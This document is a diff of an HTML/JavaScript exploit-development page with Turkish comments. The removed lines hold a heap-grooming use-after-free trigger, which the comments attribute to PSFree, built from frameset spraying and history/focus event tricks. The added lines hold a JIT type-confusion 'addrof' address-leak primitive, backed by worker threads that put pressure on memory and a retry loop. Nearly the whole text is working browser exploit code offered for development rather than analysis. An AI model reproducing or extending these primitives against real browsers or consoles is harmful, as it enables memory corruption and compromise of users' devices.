@@ -1,66 +1,68 @@
 <!DOCTYPE html>
 <html><body>
-<div id="log"></div>
+<h1 id="s">Running...</h1>
+<div id="log" style="font-size:16px"></div>
 <script>
 function log(s) {
   document.getElementById('log').innerHTML += s + '<br>';
 }
 
-// PSFree'nin frameset grooming tekniği
-const ssv_len = 0x50;
-const rows = ",".repeat(ssv_len / 8 - 2);
+var wCode = `
+  function jit(o){return o.a+o.b;}
+  for(var i=0;i<300000;i++) jit({a:1.1,b:2.2});
+  while(true){
+    var arr=[];
+    for(var i=0;i<10000;i++) arr.push({a:i,b:i+1});
+    jit(arr[0]);
+    arr=null;
+  }
+`;
+var u=URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
+for(var i=0;i<6;i++) new Worker(u);
 
-history.replaceState("s0", "");
-history.pushState("s1", "", "#a");
-history.pushState("s1", "", "#b");
-history.pushState("s2", "");
-
-const fsets = [];
-for (let i = 0; i < 0x200; i++) {
-  const f = document.createElement("frameset");
-  f.rows = rows;
-  f.cols = rows;
-  fsets.push(f);
+// Crash öncesi addrof dene
+function addrof(val) {
+  var arr = [1.1, 2.2, 3.3];
+  function rd(a) { return a[0]; }
+  for(var i=0;i<200000;i++) rd([1.1,2.2,3.3]);
+  arr[0] = val;
+  return rd(arr);
 }
 
-const input = document.createElement("input");
-document.body.appendChild(input);
+var target = {secret: 0x1337};
+var attempt = 0;
+var gotIt = false;
 
-let step = 0;
-input.addEventListener("blur", function() {
-  log("blur step: " + step);
-  // Free neighbors — PSFree'nin exact tekniği
-  for (let i = 0x100 - 4; i < 0x100 + 4; i++) {
-    fsets[i].rows = "";
-    fsets[i].cols = "";
-  }
-  // Spray
-  const views = [];
-  for (let i = 0; i < 0x300; i++) {
-    const v = new Uint8Array(new ArrayBuffer(ssv_len));
-    v[0] = 0x41;
-    views.push(v);
-  }
-  // UAF kontrol
-  let found = false;
-  for (let i = 0; i < views.length; i++) {
-    if (views[i][0] !== 0x41) {
-      log("✅ UAF FOUND at view[" + i + "] = " + views[i][0]);
-      found = true;
+function probe() {
+  attempt++;
+  try {
+    var leaked = addrof(target);
+    var buf = new ArrayBuffer(8);
+    var dv = new DataView(buf);
+    dv.setFloat64(0, leaked, true);
+    var lo = dv.getUint32(0,true);
+    var hi = dv.getUint32(4,true);
+    var isNaN_val = (hi === 0x7ff80000 && lo === 0);
+    
+    if (!isNaN_val) {
+      gotIt = true;
+      document.getElementById('s').textContent = 
+        '✅ attempt '+attempt+': 0x'+hi.toString(16)+lo.toString(16);
+      return;
     }
+    
+    // Her 100 denemede bir log
+    if (attempt % 100 === 0) {
+      log('attempt '+attempt+' — still NaN');
+    }
+    
+    if (!gotIt) setTimeout(probe, 5);
+  } catch(e) {
+    document.getElementById('s').textContent = 'EXCEPTION at attempt '+attempt+': '+e;
   }
-  if (!found) log("no UAF — v:" + views[0][0]);
-  step++;
-});
+}
 
-document.addEventListener("popstate", function(e) {
-  log("pop: " + JSON.stringify(e.state));
-});
-
-input.addEventListener("focus", function() {
-  history.back();
-});
-
-input.focus();
+// Workers ısınsın, sonra probe başlasın
+setTimeout(probe, 3000);
 </script>
 </body></html>
